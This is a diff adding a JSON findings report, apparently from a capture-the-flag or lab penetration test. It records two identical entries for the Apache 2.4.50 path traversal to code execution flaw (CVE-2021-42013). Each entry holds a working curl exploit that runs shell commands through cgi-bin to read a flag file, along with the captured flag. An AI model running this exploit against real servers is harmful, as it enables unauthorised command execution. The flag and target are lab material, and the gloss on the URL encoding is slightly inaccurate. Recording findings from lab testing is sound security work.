@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:13:41.650503+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "cba289ef-5a15-4c9c-b137-29e15216aaa2",
+      "timestamp": "2026-04-14T14:13:41.650390+00:00",
+      "title": "Apache 2.4.50 Path Traversal to RCE (CVE-2021-42013) - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48783",
+      "description": "Apache HTTP Server 2.4.50 is vulnerable to CVE-2021-42013, a path traversal and remote code execution vulnerability. The vulnerability allows attackers to bypass path normalization using double URL-encoded sequences (%%32%65 = .e) to traverse directories and execute arbitrary commands via /bin/sh through the cgi-bin alias. The flag was found at /FLAG.txt.",
+      "evidence": "flag{34bf3705-7f13-4540-b94f-273371c323f1}",
+      "tool_used": "curl/manual exploitation",
+      "cve": "CVE-2021-42013",
+      "reproduction": {
+        "type": "command",
+        "command": "curl -s 'http://172.17.0.1:48783/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; cat /FLAG.txt'",
+        "expected": "flag{34bf3705-7f13-4540-b94f-273371c323f1}"
+      }
+    },
+    {
+      "id": "39c0974f-3bbd-4f89-8b7a-db5948589fa5",
+      "timestamp": "2026-04-14T14:13:41.738652+00:00",
+      "title": "Apache 2.4.50 Path Traversal to RCE (CVE-2021-42013) - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48783",
+      "description": "Apache HTTP Server 2.4.50 is vulnerable to CVE-2021-42013, a path traversal and remote code execution vulnerability. The vulnerability allows attackers to bypass path normalization using double URL-encoded sequences (%%32%65 = .e) to traverse directories and execute arbitrary commands via /bin/sh through the cgi-bin alias. The flag was found at /FLAG.txt.",
+      "evidence": "flag{34bf3705-7f13-4540-b94f-273371c323f1}",
+      "tool_used": "curl/manual exploitation",
+      "cve": "CVE-2021-42013",
+      "reproduction": {
+        "type": "command",
+        "command": "curl -s 'http://172.17.0.1:48783/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; cat /FLAG.txt'",
+        "expected": "flag{34bf3705-7f13-4540-b94f-273371c323f1}"
+      }
+    }
+  ],
+  "diagrams": []
+}
